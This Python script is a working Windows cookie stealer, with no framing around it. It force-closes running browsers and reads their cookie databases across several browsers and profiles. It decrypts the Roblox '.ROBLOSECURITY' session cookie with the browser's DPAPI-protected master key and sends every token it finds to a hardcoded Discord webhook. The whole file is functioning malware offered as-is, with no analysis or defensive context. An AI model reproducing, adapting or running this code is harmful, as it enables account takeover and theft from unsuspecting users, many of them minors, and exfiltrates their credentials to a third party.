import os
import json
import base64
import sqlite3
from pathlib import Path
import psutil
import win32crypt
from Crypto.Cipher import AES
import time
import requests

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
WEB_HOOK = "https://discordapp.com/api/webhooks/1467790287593013311/umt0amzFufQhPgsLRn9hS97-ktNwmNJeoAjavHi3Y10Nne_-ejSdZ5RNyOvY7RzuATnS"

PATHS = {
    'Chrome': LOCAL + r'\Google\Chrome\User Data',
    'Chrome SxS': LOCAL + r'\Google\Chrome SxS\User Data',
    'Edge': LOCAL + r'\Microsoft\Edge\User Data',
    'Brave': LOCAL + r'\BraveSoftware\Brave-Browser\User Data',
    'Opera': ROAMING + r'\Opera Software\Opera Stable',
    'Opera GX': ROAMING + r'\Opera Software\Opera GX Stable',
    'Vivaldi': LOCAL + r'\Vivaldi\User Data',
    'Yandex': LOCAL + r'\Yandex\YandexBrowser\User Data',
}

COOKIE_NAME = '.ROBLOSECURITY'
DOMAIN_PATTERN = '%roblox.com%'

def get_master_key(local_state_path: Path):
    if not local_state_path.exists():
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        return None

def decrypt_cookie(buff: bytes, master_key: bytes) -> str | None:
    try:
        if len(buff) < 31:
            return None
        iv = buff[3:15]
        ciphertext = buff[15:-16]
        tag = buff[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8', errors='ignore').strip()
    except Exception as e:
        return None

def extract_roblox_cookie(browser_path: Path, profile: str = 'Default'):
    all_cookies = set()
    cookies_db_path = browser_path / profile / 'Network' / 'Cookies'
    if not cookies_db_path.exists():
        cookies_db_path = browser_path / profile / 'Cookies'
        if not cookies_db_path.exists():
            return all_cookies

    try:
        temp_db = Path('temp_cookies.db')
        with open(cookies_db_path, 'rb') as f:
            temp_db.write_bytes(f.read())

        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()

        cursor.execute("""
            SELECT host_key, name, encrypted_value
            FROM cookies
            WHERE name = ? AND host_key LIKE ?
        """, (COOKIE_NAME, DOMAIN_PATTERN))

        for row in cursor.fetchall():
            host, name, enc_value = row
            master_key = get_master_key(browser_path / 'Local State')
            if master_key:
                decrypted = decrypt_cookie(enc_value, master_key)
                if decrypted and len(decrypted) > 50:
                    all_cookies.add(decrypted)
        conn.close()
        temp_db.unlink(missing_ok=True)  # Cleanup

    except Exception as e:
        pass
    return all_cookies

def scan_browsers():
    all_tokens = set()

    for name, base in PATHS.items():
        base_path = Path(base)
        if not base_path.exists():
            continue

        for profile in ['Default'] + [f'Profile {i}' for i in range(1, 6)]:
            found = extract_roblox_cookie(base_path, profile)
            if found:
                all_tokens.update(found)

    return sorted(all_tokens, key=len, reverse=True)


def kill_browser_processes():
    browsers = ['chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe', 'vivaldi.exe']
    killed_count = 0
    
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] in browsers:
            try:
                proc.terminate()
                killed_count += 1
            except psutil.NoSuchProcess:
                pass
            except psutil.AccessDenied:
                pass
            except Exception as e:
                pass    
    if killed_count > 0:
        time.sleep(2)
    else:
        pass

def dis(token):
    payload = {
        "username": "Roblox",
        "content": str(token)                   
    }
    
    req = requests.post(WEB_HOOK, json=payload)

if __name__ == "__main__":
    kill_browser_processes()
    tokens = scan_browsers()

    if not tokens:
        pass
    else:
        for token in tokens:
            dis(token)